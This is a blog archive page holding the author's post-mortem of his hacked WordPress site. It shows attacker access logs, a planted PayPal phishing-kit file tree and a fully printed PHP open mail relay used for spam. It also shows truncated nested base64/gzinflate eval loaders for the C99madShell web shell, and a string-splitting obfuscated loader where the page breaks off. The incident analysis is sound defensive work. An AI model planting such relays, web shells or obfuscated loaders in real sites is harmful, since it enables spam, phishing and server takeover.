<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width">
    <link rel="alternate" href="/feed.xml" type="application/rss+xml" title="somewhere to talk about ideas and projects and stuff like everyone else">
    <link rel="stylesheet" href="/style/main.css">
    <title>
      June 
      2014
    </title>
  </head>
  <body>
    <div class="whitebox">
      <div class="graybar top">
        <header class="top">
          <div class="slogan">somewhere to talk about random ideas and projects like everyone else</div><a href="/">
            <h1 class="logo">
              stuff
               <span class="byline">by antimatter15</span>
            </h1></a>
        </header>
      </div>
      <div id="main">
        <div class="sidebar">
          <div class="about">
            <p class="emph">
              Hi. I’m <b>Kevin Kwok</b>, and I’m currently a junior at <b>MIT</b>, 
              and this is my obligatory online presence or whatever.  
            </p>
            <p>This is my little corner of the internet, where I talk about random projects and ideas and stuff. </p>
            <p>If you want to contact me or read obnoxiously nostalgic autobiographical trivia, check out the <a href="/about"> about </a>section.</p>
          </div><br>
          <section class="archive"><a href="/archive">
              <h2>Archive</h2></a>
            <ul>
              <li>
                <ul>
                  <li><a href="/2015/12"><span class="month">December</span> <span class="year">2015</span></a></li>
                  <li><a href="/2015/08"><span class="month">August</span> <span class="year">2015</span></a></li>
                  <li><a href="/2015/06"><span class="month">June</span> <span class="year">2015</span></a></li>
                  <li><a href="/2015/05"><span class="month">May</span> <span class="year">2015</span></a></li>
                  <li><a href="/2015/04"><span class="month">April</span> <span class="year">2015</span></a></li>
                </ul><br>
              </li>
              <li>
                <ul>
                  <li><a href="/2014/12"><span class="month">December</span> <span class="year">2014</span></a></li>
                  <li><a href="/2014/07"><span class="month">July</span> <span class="year">2014</span></a></li>
                  <li><a href="/2014/06"><span class="month">June</span> <span class="year">2014</span></a></li>
                  <li><a href="/2014/05"><span class="month">May</span> <span class="year">2014</span></a></li>
                  <li><a href="/2014/04"><span class="month">April</span> <span class="year">2014</span></a></li>
                  <li><a href="/2014/03"><span class="month">March</span> <span class="year">2014</span></a></li>
                  <li><a href="/2014/02"><span class="month">February</span> <span class="year">2014</span></a></li>
                  <li><a href="/2014/01"><span class="month">January</span> <span class="year">2014</span></a></li>
                </ul><br>
              </li>
              <li>
                <ul>
                  <li><a href="/2013/12"><span class="month">December</span> <span class="year">2013</span></a></li>
                  <li><a href="/2013/11"><span class="month">November</span> <span class="year">2013</span></a></li>
                  <li><a href="/2013/10"><span class="month">October</span> <span class="year">2013</span></a></li>
                  <li><a href="/2013/09"><span class="month">September</span> <span class="year">2013</span></a></li>
                  <li><a href="/2013/08"><span class="month">August</span> <span class="year">2013</span></a></li>
                  <li><a href="/2013/07"><span class="month">July</span> <span class="year">2013</span></a></li>
                  <li><a href="/2013/06"><span class="month">June</span> <span class="year">2013</span></a></li>
                  <li><a href="/2013/05"><span class="month">May</span> <span class="year">2013</span></a></li>
                  <li><a href="/2013/04"><span class="month">April</span> <span class="year">2013</span></a></li>
                  <li><a href="/2013/03"><span class="month">March</span> <span class="year">2013</span></a></li>
                  <li><a href="/2013/02"><span class="month">February</span> <span class="year">2013</span></a></li>
                  <li><a href="/2013/01"><span class="month">January</span> <span class="year">2013</span></a></li>
                </ul><br>
              </li>
              <li>
                <ul>
                  <li><a href="/2012/12"><span class="month">December</span> <span class="year">2012</span></a></li>
                  <li><a href="/2012/11"><span class="month">November</span> <span class="year">2012</span></a></li>
                  <li><a href="/2012/10"><span class="month">October</span> <span class="year">2012</span></a></li>
                  <li><a href="/2012/09"><span class="month">September</span> <span class="year">2012</span></a></li>
                  <li><a href="/2012/08"><span class="month">August</span> <span class="year">2012</span></a></li>
                  <li><a href="/2012/07"><span class="month">July</span> <span class="year">2012</span></a></li>
                  <li><a href="/2012/06"><span class="month">June</span> <span class="year">2012</span></a></li>
                  <li><a href="/2012/05"><span class="month">May</span> <span class="year">2012</span></a></li>
                  <li><a href="/2012/04"><span class="month">April</span> <span class="year">2012</span></a></li>
                  <li><a href="/2012/03"><span class="month">March</span> <span class="year">2012</span></a></li>
                  <li><a href="/2012/02"><span class="month">February</span> <span class="year">2012</span></a></li>
                  <li><a href="/2012/01"><span class="month">January</span> <span class="year">2012</span></a></li>
                </ul><br>
              </li>
              <li>
                <ul>
                  <li><a href="/2011/12"><span class="month">December</span> <span class="year">2011</span></a></li>
                  <li><a href="/2011/11"><span class="month">November</span> <span class="year">2011</span></a></li>
                  <li><a href="/2011/10"><span class="month">October</span> <span class="year">2011</span></a></li>
                  <li><a href="/2011/09"><span class="month">September</span> <span class="year">2011</span></a></li>
                  <li><a href="/2011/08"><span class="month">August</span> <span class="year">2011</span></a></li>
                  <li><a href="/2011/07"><span class="month">July</span> <span class="year">2011</span></a></li>
                  <li><a href="/2011/06"><span class="month">June</span> <span class="year">2011</span></a></li>
                  <li><a href="/2011/05"><span class="month">May</span> <span class="year">2011</span></a></li>
                  <li><a href="/2011/04"><span class="month">April</span> <span class="year">2011</span></a></li>
                  <li><a href="/2011/03"><span class="month">March</span> <span class="year">2011</span></a></li>
                  <li><a href="/2011/02"><span class="month">February</span> <span class="year">2011</span></a></li>
                  <li><a href="/2011/01"><span class="month">January</span> <span class="year">2011</span></a></li>
                </ul><br>
              </li>
              <li>
                <ul>
                  <li><a href="/2010/12"><span class="month">December</span> <span class="year">2010</span></a></li>
                  <li><a href="/2010/11"><span class="month">November</span> <span class="year">2010</span></a></li>
                  <li><a href="/2010/10"><span class="month">October</span> <span class="year">2010</span></a></li>
                  <li><a href="/2010/09"><span class="month">September</span> <span class="year">2010</span></a></li>
                  <li><a href="/2010/08"><span class="month">August</span> <span class="year">2010</span></a></li>
                  <li><a href="/2010/07"><span class="month">July</span> <span class="year">2010</span></a></li>
                  <li><a href="/2010/06"><span class="month">June</span> <span class="year">2010</span></a></li>
                  <li><a href="/2010/05"><span class="month">May</span> <span class="year">2010</span></a></li>
                  <li><a href="/2010/04"><span class="month">April</span> <span class="year">2010</span></a></li>
                  <li><a href="/2010/03"><span class="month">March</span> <span class="year">2010</span></a></li>
                  <li><a href="/2010/02"><span class="month">February</span> <span class="year">2010</span></a></li>
                  <li><a href="/2010/01"><span class="month">January</span> <span class="year">2010</span></a></li>
                </ul><br>
              </li>
              <li>
                <ul>
                  <li><a href="/2009/12"><span class="month">December</span> <span class="year">2009</span></a></li>
                  <li><a href="/2009/11"><span class="month">November</span> <span class="year">2009</span></a></li>
                  <li><a href="/2009/10"><span class="month">October</span> <span class="year">2009</span></a></li>
                  <li><a href="/2009/09"><span class="month">September</span> <span class="year">2009</span></a></li>
                  <li><a href="/2009/08"><span class="month">August</span> <span class="year">2009</span></a></li>
                  <li><a href="/2009/07"><span class="month">July</span> <span class="year">2009</span></a></li>
                  <li><a href="/2009/06"><span class="month">June</span> <span class="year">2009</span></a></li>
                  <li><a href="/2009/05"><span class="month">May</span> <span class="year">2009</span></a></li>
                  <li><a href="/2009/04"><span class="month">April</span> <span class="year">2009</span></a></li>
                  <li><a href="/2009/03"><span class="month">March</span> <span class="year">2009</span></a></li>
                  <li><a href="/2009/01"><span class="month">January</span> <span class="year">2009</span></a></li>
                </ul><br>
              </li>
              <li>
                <ul>
                  <li><a href="/2008/12"><span class="month">December</span> <span class="year">2008</span></a></li>
                  <li><a href="/2008/11"><span class="month">November</span> <span class="year">2008</span></a></li>
                  <li><a href="/2008/10"><span class="month">October</span> <span class="year">2008</span></a></li>
                  <li><a href="/2008/09"><span class="month">September</span> <span class="year">2008</span></a></li>
                  <li><a href="/2008/08"><span class="month">August</span> <span class="year">2008</span></a></li>
                  <li><a href="/2008/07"><span class="month">July</span> <span class="year">2008</span></a></li>
                  <li><a href="/2008/06"><span class="month">June</span> <span class="year">2008</span></a></li>
                  <li><a href="/2008/05"><span class="month">May</span> <span class="year">2008</span></a></li>
                  <li><a href="/2008/04"><span class="month">April</span> <span class="year">2008</span></a></li>
                  <li><a href="/2008/01"><span class="month">January</span> <span class="year">2008</span></a></li>
                </ul><br>
              </li>
              <li>
                <ul>
                  <li><a href="/2007/12"><span class="month">December</span> <span class="year">2007</span></a></li>
                  <li><a href="/2007/11"><span class="month">November</span> <span class="year">2007</span></a></li>
                  <li><a href="/2007/10"><span class="month">October</span> <span class="year">2007</span></a></li>
                  <li><a href="/2007/09"><span class="month">September</span> <span class="year">2007</span></a></li>
                  <li><a href="/2007/08"><span class="month">August</span> <span class="year">2007</span></a></li>
                  <li><a href="/2007/05"><span class="month">May</span> <span class="year">2007</span></a></li>
                </ul><br>
              </li>
              <li>
                <ul>
                  <li><a href="/2006/09"><span class="month">September</span> <span class="year">2006</span></a></li>
                  <li><a href="/2006/08"><span class="month">August</span> <span class="year">2006</span></a></li>
                </ul><br>
              </li>
            </ul>
          </section>
          <div class="tags">
            <h2>Tags</h2><a href="/tag/3D" style="font-size: 13px">3D </a><a href="/tag/actionscript" style="font-size: 11px">actionscript </a><a href="/tag/ajax" style="font-size: 20px">ajax </a><a href="/tag/ajax animator" style="font-size: 20px">ajax animator </a><a href="/tag/api" style="font-size: 13px">api </a><a href="/tag/apple" style="font-size: 20px">apple </a><a href="/tag/arduino" style="font-size: 11px">arduino </a><a href="/tag/art" style="font-size: 13px">art </a><a href="/tag/awesome" style="font-size: 13px">awesome </a><a href="/tag/blog" style="font-size: 19px">blog </a><a href="/tag/browser" style="font-size: 20px">browser </a><a href="/tag/bugfix" style="font-size: 15px">bugfix </a><a href="/tag/canvas" style="font-size: 15px">canvas </a><a href="/tag/change" style="font-size: 15px">change </a><a href="/tag/chrome" style="font-size: 20px">chrome </a><a href="/tag/code" style="font-size: 13px">code </a><a href="/tag/color" style="font-size: 11px">color </a><a href="/tag/colors" style="font-size: 11px">colors </a><a href="/tag/css" style="font-size: 11px">css </a><a href="/tag/design" style="font-size: 20px">design </a><a href="/tag/doge" style="font-size: 11px">doge </a><a href="/tag/elitist" style="font-size: 20px">elitist </a><a href="/tag/evil" style="font-size: 19px">evil </a><a href="/tag/experiment" style="font-size: 15px">experiment </a><a href="/tag/export" style="font-size: 11px">export </a><a href="/tag/extension" style="font-size: 20px">extension </a><a href="/tag/ExtJS" style="font-size: 20px">ExtJS </a><a href="/tag/fast" style="font-size: 20px">fast </a><a href="/tag/features" style="font-size: 15px">features </a><a href="/tag/firefox" style="font-size: 20px">firefox </a><a href="/tag/flash" style="font-size: 17px">flash </a><a href="/tag/format" style="font-size: 11px">format </a><a href="/tag/function" style="font-size: 13px">function </a><a href="/tag/future" style="font-size: 15px">future </a><a href="/tag/GAE" style="font-size: 13px">GAE </a><a href="/tag/github" style="font-size: 15px">github </a><a href="/tag/google" style="font-size: 20px">google </a><a href="/tag/google code" style="font-size: 11px">google code </a><a href="/tag/google wave" style="font-size: 20px">google wave </a><a href="/tag/graphics" style="font-size: 17px">graphics </a><a href="/tag/hacking" style="font-size: 11px">hacking </a><a href="/tag/hardware" style="font-size: 11px">hardware </a><a href="/tag/hosting" style="font-size: 19px">hosting </a><a href="/tag/html5" style="font-size: 19px">html5 </a><a href="/tag/idea" style="font-size: 13px">idea </a><a href="/tag/image" style="font-size: 11px">image </a><a href="/tag/internet exploder" style="font-size: 20px">internet exploder </a><a href="/tag/ipad" style="font-size: 17px">ipad </a><a href="/tag/javascript" style="font-size: 20px">javascript </a><a href="/tag/json" style="font-size: 15px">json </a><a href="/tag/library" style="font-size: 11px">library </a><a href="/tag/light" style="font-size: 11px">light </a><a href="/tag/lines" style="font-size: 13px">lines </a><a href="/tag/linux" style="font-size: 17px">linux </a><a href="/tag/login" style="font-size: 15px">login </a><a href="/tag/magical" style="font-size: 15px">magical </a><a href="/tag/meta" style="font-size: 13px">meta </a><a href="/tag/microsoft" style="font-size: 15px">microsoft </a><a href="/tag/microwave" style="font-size: 15px">microwave </a><a href="/tag/mirror" style="font-size: 11px">mirror </a><a href="/tag/mit" style="font-size: 11px">mit </a><a href="/tag/multitouch" style="font-size: 13px">multitouch </a><a href="/tag/new" style="font-size: 19px">new </a><a href="/tag/nostalgia" style="font-size: 11px">nostalgia </a><a href="/tag/ocr" style="font-size: 13px">ocr </a><a href="/tag/offline" style="font-size: 17px">offline </a><a href="/tag/old" style="font-size: 17px">old </a><a href="/tag/onlypaths" style="font-size: 17px">onlypaths </a><a href="/tag/pi" style="font-size: 19px">pi </a><a href="/tag/progress" style="font-size: 11px">progress </a><a href="/tag/prototype" style="font-size: 13px">prototype </a><a href="/tag/python" style="font-size: 20px">python </a><a href="/tag/raphael" style="font-size: 19px">raphael </a><a href="/tag/release" style="font-size: 13px">release </a><a href="/tag/rewrite" style="font-size: 13px">rewrite </a><a href="/tag/school" style="font-size: 15px">school </a><a href="/tag/security" style="font-size: 15px">security </a><a href="/tag/shiny" style="font-size: 20px">shiny </a><a href="/tag/ShinyTouch" style="font-size: 13px">ShinyTouch </a><a href="/tag/simple" style="font-size: 11px">simple </a><a href="/tag/site" style="font-size: 13px">site </a><a href="/tag/small" style="font-size: 20px">small </a><a href="/tag/spam" style="font-size: 11px">spam </a><a href="/tag/speed" style="font-size: 11px">speed </a><a href="/tag/SVG" style="font-size: 15px">SVG </a><a href="/tag/touch" style="font-size: 13px">touch </a><a href="/tag/update" style="font-size: 20px">update </a><a href="/tag/upload" style="font-size: 17px">upload </a><a href="/tag/user interface" style="font-size: 11px">user interface </a><a href="/tag/vector" style="font-size: 13px">vector </a><a href="/tag/vectoreditor" style="font-size: 19px">vectoreditor </a><a href="/tag/version" style="font-size: 13px">version </a><a href="/tag/video" style="font-size: 15px">video </a><a href="/tag/vp8" style="font-size: 11px">vp8 </a><a href="/tag/vX JS" style="font-size: 19px">vX JS </a><a href="/tag/wave" style="font-size: 20px">wave </a><a href="/tag/webcam" style="font-size: 11px">webcam </a><a href="/tag/wikify" style="font-size: 20px">wikify </a><a href="/tag/wikipedia" style="font-size: 17px">wikipedia </a><a href="/tag/wordpress" style="font-size: 20px">wordpress </a>
          </div>
        </div>
        <div id="content">
          <h1>
            June 
            2014<span class="thin"> Archive</span>
          </h1>
          <article class="article intro">
            <header>
              <h2><a href="/2014/06/blog-hacked/">Blog Hacked</a> <span class="subtitle">07 June 2014</span></h2>
            </header>
            <section class="content"><p><div class="pic md" style="" ><img alt=""  src="/articles/2014/Getting%20Hacked/bw-antimatter15.com-06-2014-http.png" ><div class="caption">I don&#39;t actually understand what the units of the Y axis are</div></div></p>
<p>Well, so my blog got hacked. Even more unfortunate is that I can’t seem to locate any trace of what it looked like when it was hacked. I guess that’s the problem when you write a post-mortem literally a year after the original&nbsp;incident. </p>
<p>All that’s left is some eerie hints that something&nbsp;happened.</p>
<p>My blog was averaging around <span class="caps">350MB</span> of bandwidth per day, when suddenly on June 6th, it started to spike. In fact, between June 6th and 7th, it used a total of over 40GB of bandwidth. It had eaten through my entire monthly bandwidth&nbsp;quota. </p>
<p><div class="pic md" style="" ><img alt=""  src="/articles/2014/Getting%20Hacked/table.png" ></div></p>
<p>At 6:48pm on June 7th, I had discovered that something was going on with my blog and started the process of fixing it. I looked through some of the access logs and saw a particular abundance of a strange file <code>pffam.php</code></p>
<pre><code><span style='display:none' detected-language='groovy'></span><span class="hljs-number">91.234</span><span class="hljs-number">.164</span><span class="hljs-number">.143</span> - - [<span class="hljs-number">07</span><span class="hljs-regexp">/Jun/</span><span class="hljs-number">2014</span>:<span class="hljs-number">05</span>:<span class="hljs-number">07</span>:<span class="hljs-number">18</span> -<span class="hljs-number">0400</span>] <span class="hljs-string">"<span class="caps">POST</span> /wp/wp-content/themes/carrington-woot/pffam.php HTTP/1.1"</span> <span class="hljs-number">500</span> <span class="hljs-number">7309</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/3.0 (compatible; Indy Library)"</span>
<span class="hljs-number">78.26</span><span class="hljs-number">.204</span><span class="hljs-number">.99</span> - - [<span class="hljs-number">07</span><span class="hljs-regexp">/Jun/</span><span class="hljs-number">2014</span>:<span class="hljs-number">05</span>:<span class="hljs-number">07</span>:<span class="hljs-number">19</span> -<span class="hljs-number">0400</span>] <span class="hljs-string">"<span class="caps">POST</span> /wp/wp-content/themes/carrington-woot/pffam.php HTTP/1.1"</span> <span class="hljs-number">500</span> <span class="hljs-number">7309</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/3.0 (compatible; Indy Library)"</span>
<span class="hljs-number">46.173</span><span class="hljs-number">.111</span><span class="hljs-number">.151</span> - - [<span class="hljs-number">07</span><span class="hljs-regexp">/Jun/</span><span class="hljs-number">2014</span>:<span class="hljs-number">05</span>:<span class="hljs-number">07</span>:<span class="hljs-number">21</span> -<span class="hljs-number">0400</span>] <span class="hljs-string">"<span class="caps">POST</span> /wp/wp-content/themes/carrington-woot/pffam.php HTTP/1.1"</span> <span class="hljs-number">500</span> <span class="hljs-number">7309</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/3.0 (compatible; Indy Library)"</span>
</code></pre><p>Presumably <code>pffam.php</code> was the bit of malicious code which was injected onto my server, acting as a nice endpoint for recieving and executing particular actions. It seems that <a href="http://www.indyproject.org/index.en.aspx">Indy Library</a> is some sort of .<span class="caps">NET</span> library which implements&nbsp;HTTP. </p>
<p>It’s interesting that the endpoint is being hit by multiple <span class="caps">IP</span> addresses, and they all seem to geolocate to Eastern European countries. Presumably they’ve built some sort of graphical Command <span class="amp">&amp;</span> Control panel out of Visual Basic or&nbsp;something. </p>
<p>Unfortunately, it looks like I replaced the entire wordpress installation with an older backup— so I don’t actually have any copies of <code>pffam.php</code>. But it managed to use <span class="caps">40GB</span> of bandwidth, and hackers are hardly keen on keeping all their eggs in one bucket, so surely there must have been other endpoints—&nbsp;right?</p>
<p>Sure enough, there’s another&nbsp;endpoint:</p>
<pre><code><span style='display:none' detected-language='groovy'></span><span class="hljs-number">109.87</span><span class="hljs-number">.224</span><span class="hljs-number">.22</span> - - [<span class="hljs-number">06</span><span class="hljs-regexp">/Jun/</span><span class="hljs-number">2014</span>:<span class="hljs-number">21</span>:<span class="hljs-number">18</span>:<span class="hljs-number">06</span> -<span class="hljs-number">0400</span>] <span class="hljs-string">"<span class="caps">POST</span> /ajaxanimator/stick2-old/jsgif/Demos/dswbk.php HTTP/1.1"</span> <span class="hljs-number">200</span> <span class="hljs-number">4</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/3.0 (compatible; Indy Library)"</span>
</code></pre><p>And it looks like it was buried underneath enough files that I hadn’t noticed and deleted it— woot? In fact there’s actually a number of fascinating files and folders in that&nbsp;directory</p>
<pre><code><span style='display:none' detected-language='sql'></span>├── IT2_9z38yd
├── PwdbqQ3nh0
├── SLn30gBqqv
├── SPIFBSYgsr
├── UXLPRmw9YY
├── XviRYdmJ4H
├── baZn0aynkw
├── bosa.php
├── dibdt.php
├── dswbk.php
├── fr1.php
├── hummjvq.php
├── ptRiJiayze
│   ├── VjQauM_3Ev
│   │   ├── btn_bg_sprite.gif
│   │   ├── cv_amex_card.gif
│   │   ├── cv_card.gif
│   │   ├── de-security-hero.png
│   │   ├── form.css
│   │   ├── form.dat
│   │   ├── form.php
│   │   ├── <span class="hljs-operator"><span class="hljs-keyword">help</span>.jpg
│   │   ├── help2.html
│   │   ├── hr-gradient-sprite.png
│   │   ├── ie6.css
│   │   ├── ie7.css
│   │   ├── ie8.css
│   │   ├── <span class="hljs-keyword">index</span>.css
│   │   ├── <span class="hljs-keyword">index</span>.dat
│   │   ├── <span class="hljs-keyword">index</span>.php
│   │   ├── interior-gradient-bottom.png
│   │   ├── interior-gradient-top.png
│   │   ├── jquery.creditCardValidator.js
│   │   ├── jquery.<span class="hljs-keyword">min</span>.js
│   │   ├── jquery.validationEngine-de.js
│   │   ├── jquery.validationEngine.js
│   │   ├── leftknob.png
│   │   ├── loading.css
│   │   ├── loading.php
│   │   ├── logo_paypal_106x29.png
│   │   ├── <span class="hljs-keyword">mid</span>.swf
│   │   ├── midopt.swf
│   │   ├── mini_cvv2.gif
│   │   ├── nav_sprite.gif
│   │   ├── paypal_logo.gif
│   │   ├── pp_favicon_x.ico
│   │   ├── scr_arrow_4x6.gif
│   │   ├── scr_backgradient_1x250.gif
│   │   ├── scr_content-bkgd.png
│   │   ├── scr_gray-bkgd.png
│   │   ├── scr_gray-bkgd_001.png
│   │   ├── secure_lock_2.gif
│   │   ├── sprite_flag_22x16.png
│   │   ├── sprite_header_footer_94.png
│   │   ├── sprite_ia.png
│   │   ├── sprite_ia_001.png
│   │   ├── validationEngine.jquery.css
│   │   ├── verify
│   │   └── vertical-gradient-sprite.png
│   └── verification
├── sthy.php
├── vlizzvij.php
├── x4MslaR1CW
│   ├── BN3R5U8sF5
│   │   ├── btn_bg_sprite.gif
│   │   ├── cv_amex_card.gif
│   │   ├── cv_card.gif
│   │   ├── de-security-hero.png
│   │   ├── form.css
│   │   ├── form.dat
│   │   ├── form.php
│   │   ├── <span class="hljs-keyword">help</span>.jpg
│   │   ├── help2.html
│   │   ├── hr-gradient-sprite.png
│   │   ├── ie6.css
│   │   ├── ie7.css
│   │   ├── ie8.css
│   │   ├── <span class="hljs-keyword">index</span>.css
│   │   ├── <span class="hljs-keyword">index</span>.dat
│   │   ├── <span class="hljs-keyword">index</span>.php
│   │   ├── interior-gradient-bottom.png
│   │   ├── interior-gradient-top.png
│   │   ├── jquery.creditCardValidator.js
│   │   ├── jquery.<span class="hljs-keyword">min</span>.js
│   │   ├── jquery.validationEngine-de.js
│   │   ├── jquery.validationEngine.js
│   │   ├── leftknob.png
│   │   ├── loading.css
│   │   ├── loading.php
│   │   ├── logo_paypal_106x29.png
│   │   ├── <span class="hljs-keyword">mid</span>.swf
│   │   ├── midopt.swf
│   │   ├── mini_cvv2.gif
│   │   ├── nav_sprite.gif
│   │   ├── paypal_logo.gif
│   │   ├── pp_favicon_x.ico
│   │   ├── scr_arrow_4x6.gif
│   │   ├── scr_backgradient_1x250.gif
│   │   ├── scr_content-bkgd.png
│   │   ├── scr_gray-bkgd.png
│   │   ├── scr_gray-bkgd_001.png
│   │   ├── secure_lock_2.gif
│   │   ├── sprite_flag_22x16.png
│   │   ├── sprite_header_footer_94.png
│   │   ├── sprite_ia.png
│   │   ├── sprite_ia_001.png
│   │   ├── validationEngine.jquery.css
│   │   ├── verify
│   │   └── vertical-gradient-sprite.png
│   └── verification
├── xstyles.php
└── yl27ceCuPh</span>
</code></pre><hr>
<p>So it looks like most of these folders are actually empty, and a lot of the rest of the top level <span class="caps">PHP</span> files are the&nbsp;same. </p>
<p>It seems that <code>bosa.php</code>, <code>dibdt.php</code>, <code>dswbk.php</code>, <code>hummjvq.php</code>, <code>sthy.php</code>, and <code>vlizzvij.php</code> are&nbsp;identical. </p>
<pre><code><span style='display:none' detected-language='bash'></span>&lt;?php
<span class="hljs-variable">$to</span>      = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"to_address"</span>]);
<span class="hljs-variable">$<span class="caps">BCC</span></span>      = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"<span class="caps">BCC</span>"</span>]);
<span class="hljs-variable">$subject</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"subject"</span>]);
<span class="hljs-variable">$message</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"body"</span>]);
<span class="hljs-variable">$from_address</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"from_address"</span>]);
<span class="hljs-variable">$from_name</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"from_name"</span>]); 
<span class="hljs-variable">$contenttype</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">"type"</span>];


<span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$from_address</span>) &gt; <span class="hljs-number">3</span>)
{
<span class="hljs-variable">$header</span> = <span class="hljs-string">"<span class="caps">MIME</span>-Version: 1.0\r\n"</span>;
<span class="hljs-variable">$header</span> .= <span class="hljs-string">"Content-Type: text/<span class="hljs-variable">$contenttype</span>\r\n"</span>;
<span class="hljs-variable">$header</span> .=  <span class="hljs-string">"From: <span class="hljs-variable">$from_name</span> &lt;<span class="hljs-variable">$from_address</span>&gt;\r\n"</span>;
<span class="hljs-variable">$header</span> .=  <span class="hljs-string">"Reply-To: <span class="hljs-variable">$from_name</span> &lt;<span class="hljs-variable">$from_address</span>&gt;\r\n"</span>;
<span class="hljs-variable">$header</span> .= <span class="hljs-string">"Subject: <span class="hljs-variable">$subject</span>\r\n"</span>;

<span class="hljs-variable">$result</span> = mail(stripslashes(<span class="hljs-variable">$to</span>), stripslashes(<span class="hljs-variable">$subject</span>), stripslashes(<span class="hljs-variable">$message</span>), stripslashes(<span class="hljs-variable">$header</span>));
}
<span class="hljs-keyword">else</span>
{
<span class="hljs-variable">$result</span> = mail(stripslashes(<span class="hljs-variable">$to</span>), stripslashes(<span class="hljs-variable">$subject</span>), stripslashes(<span class="hljs-variable">$message</span>));
}




<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)
{
<span class="hljs-built_in">echo</span> <span class="hljs-string">'good'</span>;
}
<span class="hljs-keyword">else</span>
{
    <span class="hljs-string">'error : '</span>.<span class="hljs-variable">$result</span>;
}
?&gt;
</code></pre><p>I’m guessing that it’s being used to send spam messages to different people using the <span class="caps">PHP</span> <code>mail()</code> function. </p>
<hr>
<p>More interesting is <code>fr1.php</code>, which is obfuscated as a giant base 64 encoded gzipped&nbsp;string. </p>
<pre><code><span style='display:none' detected-language='bash'></span><span class="hljs-built_in">eval</span>(gzinflate(base64_decode(<span class="hljs-string">'HZzHkoTKkkQ/591r...h/Pp/jc/L/+59///33f/4f'</span>)));
</code></pre><p>So to see what went inside, I stuck it in a different file and replaced the <code>eval</code> with <code>echo</code>. The first time I ran it, I had a bit of a double take because the result looked like&nbsp;this:</p>
<pre><code><span style='display:none' detected-language='bash'></span><span class="hljs-built_in">eval</span>(gzinflate(base64_decode(<span class="hljs-string">'FZ23kuNKtkU/Z+<span class="caps">4NGN</span>...gRP6r//+ffff//v/wE='</span>)));
</code></pre><p>And if two times isn’t sufficiently meta, this happens a&nbsp;third</p>
<pre><code><span style='display:none' detected-language='bash'></span><span class="hljs-built_in">eval</span>(gzinflate(base64_decode(<span class="hljs-string">'FZy3buRaFkU/Z94DA3q...GAfkEQPM8TBK/yP//+++9//w8='</span>)));
</code></pre><p>A&nbsp;fourth…</p>
<pre><code><span style='display:none' detected-language='bash'></span><span class="hljs-built_in">eval</span>(gzinflate(base64_decode(<span class="hljs-string">'HZ3HkqPqlkYf554TDPAuO...7fM8QRAFr//+9z///vvv//wf'</span>)));
</code></pre><p>fifth…</p>
<pre><code><span style='display:none' detected-language='bash'></span><span class="hljs-built_in">eval</span>(gzinflate(base64_decode(<span class="hljs-string">'FZzHjuNaskU/p+<span class="caps">8FB</span>/...qAgCFAAAIIgiYKX8N///Pvvv//3/w=='</span>)));
</code></pre><p>sixth…</p>
<pre><code><span style='display:none' detected-language='bash'></span><span class="hljs-built_in">eval</span>(gzinflate(base64_decode(<span class="hljs-string">'FZzHbuvKtkU/554...L63//+8++///73/wE='</span>)));
</code></pre><p>seventh…</p>
<pre><code><span style='display:none' detected-language='bash'></span><span class="hljs-built_in">echo</span>(gzinflate(base64_decode(<span class="hljs-string">'FZ3HbuRKEkU/Z94...4nCAI0SDH/+ffff//7fw=='</span>)));
</code></pre><p>Actually, it goes on <strong>40 more times</strong>, like a demented matroyshka doll. It’s not <span class="caps">UTF</span>-8 encoded, so I had to guess a handful of encodings before discovering that it was what Sublime Text calls “Cyrillic (Windows 1251)”. It’s 1500 lines, so I’ve posted it in a <a href="https://gist.github.com/antimatter15/f40a4615c68eea373ad4">Gist</a> rather than sticking it inline&nbsp;here. </p>
<p>I skimmed through the code and it seemed relatively safe— or at least it didn’t seem to plant any rootkits or start any persistent processes. So I ran it and got a screenshot. It seems to call itself “C99madShell v. 3.0 <span class="caps">BLOG</span>&nbsp;edition.php”</p>
<p><div class="pic md" style="" ><img alt="WebShell"  src="/articles/2014/Getting%20Hacked/webshell.png" ></div></p>
<hr>
<p>The other distinct file, <code>xstyles.php</code> seems to be a little more&nbsp;unique. </p>
<pre><code><span style='display:none' detected-language='tex'></span>&lt;?php 

<span class="hljs-formula">$n = 'ss';
$</span>r ="rt";
<span class="hljs-formula">$a = "a";
$</span>y='e';
<span class="hljs-formula">$q = $</span>a.<span class="hljs-formula">$n.$</span>y.<span class="hljs-formula">$r;

$</span>v = '5b17fxo30zD8d/Ip5C3tQoMx4CRXYgx...8B';

@<span class="hljs-formula">$q("e"."va"."l('<span class="hljs-command">\x</span>65<span class="hljs-command">\x</span>76<span class="hljs-command">\x</span>61<span class="hljs-command">\x</span>6c<span class="hljs-command">\x</span>28<span class="hljs-command">\x</span>67<span class="hljs-command">\x</span>7a<span class="hljs-command">\x</span>69<span class="hljs-command">\x</span>6e<span class="hljs-command">\x</span>66<span class="hljs-command">\x</span>6c<span class="hljs-command">\x</span>61<span class="hljs-command">\x</span>74<span class="hljs-command">\x</span>65<span class="hljs-command">\x</span>28<span class="hljs-command">\x</span>62<span class="hljs-command">\x</span>61<span class="hljs-command">\x</span>73<span class="hljs-command">\x</span>65<span class="hljs-command">\x</span>36<span class="hljs-command">\x</span>34<span class="hljs-command">\x</span>5f<span class="hljs-command">\x</span>64<span class="hljs-command">\x</span>65<span class="hljs-command">\x</span>63<span class="hljs-command">\x</span>6f<span class="hljs-command">\x</span>64<span class="hljs-command">\x</span>65<span class="hljs-command">\x</span>28<span class="hljs-command">\x</span>24<span class="hljs-command">\x</span>76<span class="hljs-command">\x</span>29<span class="hljs-command">\x</span>29<span class="hljs-command">\x</span>29<span class="hljs-command">\x</span>3b');");</span>
